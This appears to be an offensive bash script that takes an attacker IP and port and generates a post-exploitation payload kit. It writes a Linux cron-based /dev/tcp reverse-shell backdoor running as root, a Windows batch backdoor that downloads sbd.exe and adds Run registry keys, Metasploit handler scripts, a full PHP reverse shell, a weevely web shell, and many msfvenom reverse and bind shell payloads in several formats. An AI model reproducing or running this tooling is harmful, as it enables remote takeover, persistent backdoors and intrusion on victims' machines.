echo "hola $1 $2"


echo "echo 'bash -c \"bash -i >& /dev/tcp/$1/$2 0>&1\"' >/etc/backin.sh" >payloads/postexploit/linux/backdor.sh
echo "chmod +x /etc/backin.sh" >>payloads/postexploit/linux/backdor.sh
echo "echo \"*/5 *	* * *	root    /etc/backin.sh\" >>/etc/crontab" >>payloads/postexploit/linux/backdor.sh
echo "/etc/init.d/cron reload" >>payloads/postexploit/linux/backdor.sh

echo "cd c:\\windows\\system32\\" >payloads/postexploit/windows/backdor.bat
echo "cscript wget.vbs http://$1/postexploit/windows/sbd.exe sbd.exe" >>payloads/postexploit/windows/backdor.bat
echo "REG add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Run\" /v backin /d \"sbd -lvvp $2 -k popocatepetl\"" >>payloads/postexploit/windows/backdor.bat
echo "REG add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v backin /d \"sbd -lvvp $2 -k popocatepetl\"" >>payloads/postexploit/windows/backdor.bat
echo "start sbd -lvvp $2 -k popocatepetl" >>payloads/postexploit/windows/backdor.bat

echo use exploit/multi/handler > payloads/msf_windows_mrs.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> payloads/msf_windows_mrs.rc
echo set LHOST $1 >> payloads/msf_windows_mrs.rc
echo set LPORT $2 >> payloads/msf_windows_mrs.rc
echo set ExitOnSession false >> payloads/msf_windows_mrs.rc
echo exploit -j -z >> payloads/msf_windows_mrs.rc

echo use exploit/multi/handler > payloads/msf_windows_rs.rc
echo set PAYLOAD windows/shell/reverse_tcp >> payloads/msf_windows_rs.rc
echo set LHOST $1 >> payloads/msf_windows_rs.rc
echo set LPORT $2 >> payloads/msf_windows_rs.rc
echo set ExitOnSession false >> payloads/msf_windows_rs.rc
echo exploit -j -z >> payloads/msf_windows_rs.rc



echo use exploit/multi/handler > payloads/msf_windows_mbs.rc
echo set PAYLOAD windows/meterpreter/bind_tcp >> payloads/msf_windows_mbs.rc
echo set RHOST $1 >> payloads/msf_windows_mbs.rc
echo set LPORT $2 >> payloads/msf_windows_mbs.rc
echo set ExitOnSession false >> payloads/msf_windows_mbs.rc
echo exploit -j -z >> payloads/msf_windows_mbs.rc

echo use exploit/multi/handler > payloads/msf_windows_bs.rc
echo set PAYLOAD windows/shell/bind_tcp >> payloads/msf_windows_bs.rc
echo set RHOST $1 >> payloads/msf_windows_bs.rc
echo set LPORT $2 >> payloads/msf_windows_bs.rc
echo set ExitOnSession false >> payloads/msf_windows_bs.rc
echo exploit -j -z >> payloads/msf_windows_bs.rc



echo use exploit/multi/handler > payloads/msf_linux_x86_mrs.rc
echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> payloads/msf_linux_x86_mrs.rc
echo set LHOST $1 >> payloads/msf_linux_x86_mrs.rc
echo set LPORT $2 >> payloads/msf_linux_x86_mrs.rc
echo set ExitOnSession false >> payloads/msf_linux_x86_mrs.rc
echo exploit -j -z >> payloads/msf_linux_x86_mrs.rc

echo use exploit/multi/handler > payloads/msf_linux_x86_rs.rc
echo set PAYLOAD linux/x86/shell/reverse_tcp >> payloads/msf_linux_x86_rs.rc
echo set LHOST $1 >> payloads/msf_linux_x86_rs.rc
echo set LPORT $2 >> payloads/msf_linux_x86_rs.rc
echo set ExitOnSession false >> payloads/msf_linux_x86_rs.rc
echo exploit -j -z >> payloads/msf_linux_x86_rs.rc

echo use exploit/multi/handler > payloads/msf_linux_x64_mrs.rc
echo set PAYLOAD linux/x64/meterpreter/reverse_tcp >> payloads/msf_linux_x64_mrs.rc
echo set LHOST $1 >> payloads/msf_linux_x64_mrs.rc
echo set LPORT $2 >> payloads/msf_linux_x64_mrs.rc
echo set ExitOnSession false >> payloads/msf_linux_x64_mrs.rc
echo exploit -j -z >> payloads/msf_linux_x64_mrs.rc

echo use exploit/multi/handler > payloads/msf_linux_x64_rs.rc
echo set PAYLOAD linux/x64/shell/reverse_tcp >> payloads/msf_linux_x64_rs.rc
echo set LHOST $1 >> payloads/msf_linux_x64_rs.rc
echo set LPORT $2 >> payloads/msf_linux_x64_rs.rc
echo set ExitOnSession false >> payloads/msf_linux_x64_rs.rc
echo exploit -j -z >> payloads/msf_linux_x64_rs.rc



echo use exploit/multi/handler > payloads/msf_linux_x86_mbs.rc
echo set PAYLOAD linux/x86/meterpreter/bind_tcp >> payloads/msf_linux_x86_mbs.rc
echo set RHOST $1 >> payloads/msf_linux_x86_mbs.rc
echo set LPORT $2 >> payloads/msf_linux_x86_mbs.rc
echo set ExitOnSession false >> payloads/msf_linux_x86_mbs.rc
echo exploit -j -z >> payloads/msf_linux_x86_mbs.rc

echo use exploit/multi/handler > payloads/msf_linux_x86_bs.rc
echo set PAYLOAD linux/x86/shell_bind_tcp >> payloads/msf_linux_x86_bs.rc
echo set RHOST $1 >> payloads/msf_linux_x86_bs.rc
echo set LPORT $2 >> payloads/msf_linux_x86_bs.rc
echo set ExitOnSession false >> payloads/msf_linux_x86_bs.rc
echo exploit -j -z >> payloads/msf_linux_x86_bs.rc

echo use exploit/multi/handler > payloads/msf_linux_x64_mbs.rc
echo set PAYLOAD linux/x64/meterpreter/bind_tcp >> payloads/msf_linux_x64_mbs.rc
echo set RHOST $1 >> payloads/msf_linux_x64_mbs.rc
echo set LPORT $2 >> payloads/msf_linux_x64_mbs.rc
echo set ExitOnSession false >> payloads/msf_linux_x64_mbs.rc
echo exploit -j -z >> payloads/msf_linux_x64_mbs.rc

echo use exploit/multi/handler > payloads/msf_linux_x64_bs.rc
echo set PAYLOAD linux/x64/shell_bind_tcp >> payloads/msf_linux_x64_bs.rc
echo set RHOST $1 >> payloads/msf_linux_x64_bs.rc
echo set LPORT $2 >> payloads/msf_linux_x64_bs.rc
echo set ExitOnSession false >> payloads/msf_linux_x64_bs.rc
echo exploit -j -z >> payloads/msf_linux_x64_bs.rc

echo "<?php set_time_limit (0);\$VERSION = \"1.0\";\$ip = \"$1\"; \$port = $2; \$chunk_size = 1400;\$write_a = null;\$error_a = null;\$shell = \"uname -a; w; id; /bin/sh -i\";\$daemon = 0;\$debug = 0;if (function_exists(\"pcntl_fork\")) {\$pid = pcntl_fork();if (\$pid == -1) {printit(\"ERROR: Cant fork\");exit(1);}if (\$pid) {exit(0);  }if (posix_setsid() == -1) {printit(\"Error: Cant setsid()\");exit(1);}\$daemon = 1;} else {printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);if (!\$sock) {printit(\"\$errstr (\$errno)\");exit(1);}\$descriptorspec = array(   0 => array(\"pipe\", \"r\"),     1 => array(\"pipe\", \"w\"),     2 => array(\"pipe\", \"w\")   );\$process = proc_open(\$shell, \$descriptorspec, \$pipes);if (!is_resource(\$process)) {printit(\"ERROR: Cant spawn shell\");exit(1);}stream_set_blocking(\$pipes[0], 0);stream_set_blocking(\$pipes[1], 0);stream_set_blocking(\$pipes[2], 0);stream_set_blocking(\$sock, 0);printit(\"Successfully opened reverse shell to \$ip:\$port\");while (1) {if (feof(\$sock)) {printit(\"ERROR: Shell connection terminated\");break;}if (feof(\$pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);if (in_array(\$sock, \$read_a)) {if (\$debug){ printit(\"SOCK READ\"); }\$input = fread(\$sock, \$chunk_size);if (\$debug){ printit(\"SOCK: \$input\"); }fwrite(\$pipes[0], \$input);}if (in_array(\$pipes[1], \$read_a)) {if (\$debug){ printit(\"STDOUT READ\"); }\$input = fread(\$pipes[1], \$chunk_size);if (\$debug){ printit(\"STDOUT: \$input\"); }fwrite(\$sock, \$input);}if (in_array(\$pipes[2], \$read_a)) {if (\$debug){ printit(\"STDERR READ\");}\$input = fread(\$pipes[2], \$chunk_size);if (\$debug){ printit(\"STDERR: \$input\");}fwrite(\$sock, \$input);}}fclose(\$sock);fclose(\$pipes[0]);fclose(\$pipes[1]);fclose(\$pipes[2]);proc_close(\$process);function printit (\$string) {if (!\$daemon) {print \"\$string\";}} ?> " >payloads/php_rs.php
weevely generate popocatepetl payloads/weevely_rs.php
#weevely <url> popocatepetl


msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > payloads/linux_x86_mrs.elf
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f elf > payloads/linux_x86_mbs.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > payloads/linux_x64_mrs.elf
msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f elf > payloads/linux_x64_mbs.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$1 LPORT=$2 -f elf > payloads/linux_x86_rs.elf
msfvenom -p linux/x86/shell_bind_tcp RHOST=$1 LPORT=$2 -f elf > payloads/linux_x86_bs.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$1 LPORT=$2 -f elf > payloads/linux_x64_rs.elf
msfvenom -p linux/x64/shell_bind_tcp RHOST=$1 LPORT=$2 -f elf > payloads/linux_x64_bs.elf
msfvenom -p generic/shell_bind_tcp RHOST=$1 LPORT=$2 -f elf > payloads/linux_bs.elf
msfvenom -p generic/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > payloads/linux_rs.elf

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe > payloads/windows_mrs.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f exe > payloads/windows_mbs.exe
msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f exe > payloads/windows_rs.exe
msfvenom -p windows/shell/bind_tcp RHOST=$1 LPORT=$2 -f exe > payloads/windows_bs.exe

msfvenom -p php/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f raw > payloads/php_mrs.php
cat payloads/php_mrs.php | xclip -sel clip && echo '<?php ' | tr -d '\n' > payloads/php_mrs.php && xclip -selection clipboard -o >> payloads/php_mrs.php

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f asp > payloads/windows_mrs.asp
msfvenom -p windows/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f asp > payloads/windows_mbs.asp
msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f asp > payloads/windows_rs.asp
msfvenom -p windows/shell/bind_tcp RHOST=$1 LPORT=$2 -f asp > payloads/windows_bs.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f aspx > payloads/windows_mrs.aspx
msfvenom -p windows/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f aspx > payloads/windows_mbs.aspx
msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f aspx > payloads/windows_rs.aspx
msfvenom -p windows/shell/bind_tcp RHOST=$1 LPORT=$2 -f aspx > payloads/windows_bs.aspx

msfvenom -p linux/x86/shell/reverse_tcp LHOST=$1 LPORT=$2 -f jsp > payloads/linux_x86_mrs.jsp
msfvenom -p linux/x86/shell_bind_tcp RHOST=$1 LPORT=$2 -f jsp > payloads/linux_x86_mbs.jsp
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$1 LPORT=$2 -f jsp > payloads/linux_x64_mrs.jsp
msfvenom -p linux/x64/shell_bind_tcp RHOST=$1 LPORT=$2 -f jsp > payloads/linux_x64_mbs.jsp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f war > payloads/windows_mrs.war
msfvenom -p windows/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f war > payloads/windows_mbs.war
msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f war > payloads/windows_rs.war
msfvenom -p windows/shell/bind_tcp RHOST=$1 LPORT=$2 -f war > payloads/windows_bs.war

msfvenom -p linux/x86/shell/reverse_tcp LHOST=$1 LPORT=$2 -f war > payloads/linux_x86_mrs.war
msfvenom -p linux/x86/shell_bind_tcp RHOST=$1 LPORT=$2 -f war > payloads/linux_x86_mbs.war
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$1 LPORT=$2 -f war > payloads/linux_x64_mrs.war
msfvenom -p linux/x64/shell_bind_tcp RHOST=$1 LPORT=$2 -f war > payloads/linux_x64_mbs.war



